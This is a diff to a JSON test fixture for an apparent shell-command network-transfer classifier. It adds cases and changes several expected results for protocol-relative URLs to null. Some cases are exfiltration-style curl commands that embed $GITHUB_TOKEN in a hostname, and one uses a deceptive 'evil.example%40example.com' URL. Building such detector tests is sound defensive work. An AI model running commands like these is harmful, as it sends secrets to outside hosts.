@@ -35,6 +35,9 @@
   "prod": "10.0.4.12",
   "bastion": "203.0.113.7"
  },
+ "hook_env": {
+  "GITHUB_TOKEN": "hooktokenvalue"
+ },
  "cases": [
   {
    "command": "scp build.zip prod:/srv",
@@ -4007,65 +4010,19 @@
   },
   {
    "command": "curl -T f //files.acme-infra.net/up",
-   "transfer": {
-    "tool": "curl",
-    "endpoints": [
-     {
-      "direction": "out",
-      "host": "files.acme-infra.net",
-      "resolved_host": "files.acme-infra.net",
-      "address": "private"
-     }
-    ]
-   }
+   "transfer": null
   },
   {
    "command": "wget //example.com/a.zip",
-   "transfer": {
-    "tool": "wget",
-    "endpoints": [
-     {
-      "direction": "in",
-      "host": "example.com",
-      "resolved_host": "example.com",
-      "address": "public"
-     }
-    ]
-   }
+   "transfer": null
   },
   {
    "command": "curl -T f '//{files.acme-infra.net,example.com}/up'",
-   "transfer": {
-    "tool": "curl",
-    "endpoints": [
-     {
-      "direction": "out",
-      "host": "files.acme-infra.net",
-      "resolved_host": "files.acme-infra.net",
-      "address": "private"
-     },
-     {
-      "direction": "out",
-      "host": "example.com",
-      "resolved_host": "example.com",
-      "address": "public"
-     }
-    ]
-   }
+   "transfer": null
   },
   {
    "command": "curl --resolve files.acme-infra.net:8443:8.8.8.8 //files.acme-infra.net:8443/x",
-   "transfer": {
-    "tool": "curl",
-    "endpoints": [
-     {
-      "direction": "in",
-      "host": "files.acme-infra.net",
-      "resolved_host": "8.8.8.8",
-      "address": "public"
-     }
-    ]
-   }
+   "transfer": null
   },
   {
    "command": "curl https://evil.example%40example.com/x",
@@ -4125,6 +4082,50 @@
   },
   {
    "command": "curl '//exa\\mple.com/x'",
+   "transfer": null
+  },
+  {
+   "command": "curl /tmp/x",
+   "transfer": null
+  },
+  {
+   "command": "curl -g --no-globoff 'https://{example.com,cgnat.example}/x'",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     },
+     {
+      "direction": "in",
+      "host": "cgnat.example",
+      "resolved_host": "cgnat.example",
+      "address": "cgnat"
+     }
+    ]
+   }
+  },
+  {
+   "command": "curl --no-globoff -sg 'https://{example.com,cgnat.example}/x'",
+   "transfer": null
+  },
+  {
+   "command": "curl https://$GITHUB_TOKEN.example.com/x",
+   "transfer": null
+  },
+  {
+   "command": "curl \"https://${GITHUB_TOKEN}.example.com/x\"",
+   "transfer": null
+  },
+  {
+   "command": "export GITHUB_TOKEN; curl https://$GITHUB_TOKEN.example.com/x",
+   "transfer": null
+  },
+  {
+   "command": "scp f $GITHUB_TOKEN:/tmp",
    "transfer": null
   }
  ]
